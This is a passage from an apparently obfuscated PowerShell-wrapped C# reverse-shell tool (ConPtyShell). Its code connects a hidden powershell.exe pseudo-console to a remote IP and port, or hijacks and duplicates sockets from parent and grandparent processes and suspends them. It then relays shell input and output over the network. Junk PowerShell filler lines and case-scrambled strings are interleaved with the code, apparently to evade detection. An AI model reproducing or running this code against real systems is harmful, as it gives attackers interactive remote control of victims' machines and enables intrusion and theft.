        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
        } while (bytesSent > 0 && readSuccess);
        // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
    }

    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            // Console.WriteLine("debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = " + dwBytesRead + " Marshal.GetLastWin32Error() " + Marshal.GetLastWin32Error());
            do
            {
                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
                // Console.WriteLine("debug ThreadReadPipeWriteSocket send: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
            } while (WSAGetLastError() == WSAEWOULDBLOCK);
        } while (bytesSent > 0 && readSuccess);
    }

    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
    {
        object[] threadParameters = new object[2];
        threadParameters[0] = OutputPipeRead;
        threadParameters[1] = shellSocket;
        Thread thThreadReadPipeWriteSocket;
        if(overlappedSocket)
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
        else
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }

    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
        } while (nBytesReceived > 0 && writeSuccess);
        //  Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
        TerminateProcess(hChildProcess, 0);
    }

    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        bool socketBlockingOperation = false;
        IntPtr wsaReadEvent = WSACreateEvent();
        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            // we still check WSAEWOULDBLOCK for a more robust implementation
            if (WSAGetLastError() == WSAEWOULDBLOCK)
            {
                socketBlockingOperation = true;
                continue;
            }
            WSAResetEvent(wsaReadEvent);
            socketBlockingOperation = false;
            // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
            // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
        WSACloseEvent(wsaReadEvent);
        TerminateProcess(hChildProcess, 0);
    }

    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
    {
        object[] threadParameters = new object[3];
        threadParameters[0] = InputPipeWrite;
        threadParameters[1] = shellSocket;
        threadParameters[2] = hChildProcess;
        Thread thReadSocketWritePipe;
        if(overlappedSocket)
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
        else
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }

    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        IntPtr shellSocket = IntPtr.Zero;
        IntPtr InputPipeRead = IntPtr.Zero;
        IntPtr InputPipeWrite = IntPtr.Zero;
        IntPtr OutputPipeRead = IntPtr.Zero;
        IntPtr OutputPipeWrite = IntPtr.Zero;
        IntPtr handlePseudoConsole = IntPtr.Zero;
        IntPtr oldStdIn = IntPtr.Zero;
        IntPtr oldStdOut = IntPtr.Zero;
        IntPtr oldStdErr = IntPtr.Zero;
        bool newConsoleAllocated = false;
        bool parentSocketInherited = false;
        bool grandParentSocketInherited = false;
        bool conptyCompatible = false;
        bool IsSocketOverlapped = true;
        string output = "";
        Process currentProcess = null;
        Process parentProcess = null;
        Process grandParentProcess = null;
        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
            conptyCompatible = true;
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        // comment the below function to debug errors
        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
        // init wsastartup stuff for this thread
        InitWSAThread();
        if (conptyCompatible)
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
            if (upgradeShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                currentProcess = Process.GetCurrentProcess();
                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                // try to duplicate the socket for the current process
                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    // if no sockets are found in the current process we try to hijack our current parent process socket
                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shellSocket == IntPtr.Zero)
                        {
                            throw new ConPtyShellException("no \\devICE\\aFD ObJeCts foUnd. SOcKet dUPlICatIoN FaILEd.");
                        }
                        else
                        {
                            grandParentSocketInherited = true;
                        }
                    }
                    else
                    {
                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                        parentSocketInherited = true;
                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                    }
                }
                else
                {
                    // the current process got a usable socket, let's see if the parents use the socket
                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
            {
                shellSocket = connectRemote(remoteIp, remotePort);
                if (shellSocket == IntPtr.Zero)
                {
                    output += string.Format("{0}COuld not COnNECT To iP {1} On poRT {2}", errorString, remoteIp, remotePort.ToString());
                    return output;
                }
                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
            }
            if (GetConsoleWindow() == IntPtr.Zero)
            {
                AllocConsole();
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                newConsoleAllocated = true;
            }
            // debug code for checking handle duplication
            // Console.WriteLine("DeBuG: cReatinG psEUDO COnsOlE...");
            // Thread.Sleep(180000);
            // return "";
            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
            if (pseudoConsoleCreationResult != 0)
            {
                output += string.Format("{0}cOULD not CReate psUEdo cOnsOLe. ErROR cOdE {1}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
        }
        else
        {
            if (upgradeShell)
            {
                output += string.Format("cOUlD not UPgraDE ShELl tO Fully INTeRACTIVE BECAUsE conpty is not cOmpatIBLE On THIs sySTem");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
            {
                output += string.Format("{0}cOulD not cONNect to ip {1} ON Port {2}", errorString, remoteIp, remotePort.ToString());
                return output;
            }
            Console.WriteLine("\R\ncreATEpSeUdocONsoLe function not FounD! spAwNiNg a NEtcAt-LIKE InTERactIve ShELL...\R\N");
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
            sInfo.hStdInput = InputPipeRead;
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
            CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }
        // Note: We can close the handles to the PTY-end of the pipes here
        // because the handles are dup'ed into the ConHost and will be released
        // when the ConPTY is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (upgradeShell) {
            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
        }
        //Threads have better performance than Tasks
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
        // wait for the child process until exit
        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
        //cleanup everything
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        if (upgradeShell)
        {
            if (!IsSocketOverlapped)
            {
                // cancelling the event selection for the socket
                WSAEventSelect(shellSocket, IntPtr.Zero, 0);
                SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
            }
            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
        }
        closesocket(shellSocket);
        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
        if (newConsoleAllocated)
            FreeConsole();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
        output += "ConPtyShell kindly exited.\r\n";
        return output;
    }
}
if (33 -gt 3) { Write-Host "." -NoNewline } else { Write-Host "," -NoNewline }; Write-Host ""

public static class ConPtyShellMainClass
{
    private static string help = @"";

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }

    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }

    private static void DisplayHelp()
    {
        Console.Out.Write(help);
    }

    private static string CheckRemoteIpArg(string ipString)
    {
        IPAddress address;
        if (!IPAddress.TryParse(ipString, out address))
            throw new ConPtyShellException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
        return ipString;
    }

    private static int CheckInt(string arg)
    {
        int ret = 0;
        if (!Int32.TryParse(arg, out ret))
            throw new ConPtyShellException("\r\nConPtyShell: Invalid integer value " + arg);
        return ret;
    }

    private static uint ParseRows(string[] arguments)
    {
        uint rows = 24;
        if (arguments.Length > 2)
            rows = (uint)CheckInt(arguments[2]);
        return rows;
    }

    private static uint ParseCols(string[] arguments)
    {
        uint cols = 80;
        if (arguments.Length > 3)
            cols = (uint)CheckInt(arguments[3]);
        return cols;
    }

    private static string ParseCommandLine(string[] arguments)
    {
        string commandLine = "powershell.exe";
        if (arguments.Length > 4)
            commandLine = arguments[4];
        return commandLine;
    }

    public static string ConPtyShellMain(string[] args)
    {
        string output = "";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            DisplayHelp();
        }
        else
        {
            string remoteIp = "";
            int remotePort = 0;
            bool upgradeShell = false;
            try
            {
                CheckArgs(args);
                if (args[0].Contains("upgrade"))
                    upgradeShell = true;
                else
                {
                    remoteIp = CheckRemoteIpArg(args[0]);
                    remotePort = CheckInt(args[1]);
                }
                uint rows = ParseRows(args);
                uint cols = ParseCols(args);
                string commandLine = ParseCommandLine(args);
                output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
            }
        }
        return output;
    }
}
@{ Key = 'sd6rk' }.GetType().Name | Out-Null
while ($false) {
    $tempData_2653 = New-Object -TypeName System.Collections.Generic.List[string]; $tempData_2653.Add("Item$(Get-Random -Minimum 100 -Maximum 500)") | Out-Null; $tempData_2653.Sort()
}

([xml]"<root><val>55</val></root>").root.val | Out-Null
class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
    }
}
$ADubD = 5; $ADubD = $ADubD + 2 - 5; $ADubD = $null

"@;
@{ Key = '4h9sХ' }.GetType().Name | Out-Null
if ($false) {
    $currentTimeUTC = [System.DateTime]::UtcNow; Write-Verbose "Current UTC time: $($currentTimeUTC.ToString('o'))"
}
Get-Alias -Name 'gci' -ErrorAction SilentlyContinue | Out-Null
